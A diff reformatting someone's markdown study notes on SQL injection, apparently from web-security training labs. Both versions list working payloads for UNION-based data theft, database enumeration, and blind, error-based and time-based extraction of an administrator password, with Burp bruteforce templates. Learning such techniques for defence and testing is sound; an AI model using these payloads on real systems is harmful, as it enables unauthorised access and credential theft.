@@ -1,108 +1,194 @@
 # SQL Injection
 
-**Definition**: Web security vulnerability that allows interfering with database queries.
+## Definition
+
+Web security vulnerability that allows interfering with database queries.
 
 ## Common Locations
 
-- `WHERE` clause in `SELECT`
+- `WHERE` clause in `SELECT`
     
-- `UPDATE` statements (values/`WHERE`)
+- `UPDATE` statements (values/`WHERE`)
     
-- `INSERT` statements (values)
+- `INSERT` statements (values)
     
-- `SELECT` (table/column names)
+- `SELECT` (table/column names)
     
-- `SELECT` (`ORDER BY` clause)
+- `SELECT` (`ORDER BY` clause)
     
 
 ## Basic Examples
 
-Original:  
-`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+Original:
 
-Injected:  
-`SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' -- AND released = 1`
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+Injected:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' -- AND released = 1
+```
 
 ## UNION Attacks
 
-Append additional queries:  
-`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
+Append additional queries:
+
+```sql
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+```
 
 ### Techniques
 
-1. **Find column count**:  
-    `' UNION SELECT NULL--` (Oracle: `' UNION SELECT NULL FROM DUAL--`)
+1. **Find column count**:
     
-2. **Check column types**:  
-    `' UNION SELECT NULL,'a',NULL,NULL--`
+    ```sql
+    ' UNION SELECT NULL--
+    ```
     
-3. **Steal data**:  
-    `'UNION SELECT username,password FROM users--`
+    (Oracle: `' UNION SELECT NULL FROM DUAL--`)
     
-4. **Combine fields**:  
-    `' UNION SELECT username||'~'||password FROM users--`
+2. **Check column types**:
+    
+    ```sql
+    ' UNION SELECT NULL,'a',NULL,NULL--
+    ```
+    
+3. **Steal data**:
+    
+    ```sql
+    ' UNION SELECT username,password FROM users--
+    ```
+    
+4. **Combine fields**:
+    
+    ```sql
+    ' UNION SELECT username||'~'||password FROM users--
+    ```
     
 
 ## Database Version
 
-- **MySQL/MSSQL**: `' UNION SELECT @@version--`
+- **MySQL/MSSQL**:
     
-- **Oracle**: `' UNION SELECT * FROM v$version--`
+    ```sql
+    ' UNION SELECT @@version--
+    ```
     
-- **PostgreSQL**: `' UNION SELECT version()--`
+- **Oracle**:
+    
+    ```sql
+    ' UNION SELECT * FROM v$version--
+    ```
+    
+- **PostgreSQL**:
+    
+    ```sql
+    ' UNION SELECT version()--
+    ```
     
 
 ## Database Enumeration
 
-1. **List tables**:  
-    `SELECT * FROM information_schema.tables`
+1. **List tables**:
     
-2. **List columns**:  
-    `SELECT * FROM information_schema.columns WHERE table_name='Users'`
+    ```sql
+    SELECT * FROM information_schema.tables
+    ```
     
-3. **Practical injection**:  
-    `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--`
+2. **List columns**:
     
-# Blind SQL Injection (Blind SQLi)
-Definition: Attack where app is vulnerable to SQLi but doesn't show query results in HTTP responses.
+    ```sql
+    SELECT * FROM information_schema.columns WHERE table_name='Users'
+    ```
+    
+3. **Practical injection**:
+    
+    ```sql
+    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--
+    ```
+    
 
-## Techniques:
-1. Conditional Responses:
-   - Basic checks: 
-     xyz' AND '1'='1 (true)
-     xyz' AND '1'='2 (false)
-   - Char-by-char extraction:
-     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'
-     xyz' AND SUBSTRING((...),1,1) = 's'
+---
 
-2. Password Length:
-   ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)<10)='administrator'--
+# Blind SQL Injection
 
-3. Bruteforce Password:
-   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
-   (Use Burp Intruder to automate)
+## Definition
 
-## Error-Based SQLi:
-- Conditional Errors:
-  xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' (no error)
-  xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' (error)
+Blind SQL Injection is an attack where an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query.
 
-- Data Extraction:
-  xyz' AND (SELECT CASE WHEN (Username='Admin' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'
-  (Error = true condition)
+## Common Exploitation Techniques
 
-## Summary:
-1. Boolean-Based: Check true/false responses
-2. Time-Based: Induce delays (SLEEP(), WAITFOR)
-3. Error-Based: Force DB errors
-4. OOB: Exfiltrate via DNS/HTTP
-## Payload Cheatsheet
+### Triggering Conditional Responses
 
-
+```sql
+…xyz' AND '1'='1 -- Returns True
+…xyz' AND '1'='2 -- Returns False
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm' -- Returns True
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't' -- Returns False
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' -- Returns True
 ```
-OR '1'='1' --  
-OR '1'='1' #  
-UNION SELECT NULL--  
-' UNION SELECT @@version--  
-' UNION SELECT table_name FROM information_schema.tables--  
+
+### Finding Password Length
+
+```sql
+' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) < X)='administrator'--
+```
+
+### Bruteforcing Password
+
+```sql
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')=''--
+```
+
+Use Burp Suite to bruteforce the password with appropriate payloads.
+
+---
+
+# Error-Based SQL Injection
+
+Cases where error messages help extract or infer sensitive data, even in blind contexts.
+
+### Conditional Errors
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' -- No Error
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- Error: Divide by zero
+```
+
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
+```
+
+This allows testing one character at a time.
+
+### Bruteforcing with Burp Suite
+
+```sql
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username = 'administrator' AND SUBSTR(password,$$,1)='$$') || '--
+```
+
+## Extracting Sensitive Data from SQL Error Messages
+
+Using `CAST()` as `int` to generate errors:
+
+```sql
+' AND CAST((SELECT 1) AS int)-- -- Generates an error
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+---
+
+# Executing Blind SQL Injection with Time Delays
+
+```sql
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+
+### Retrieving Password One Character at a Time
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 ```
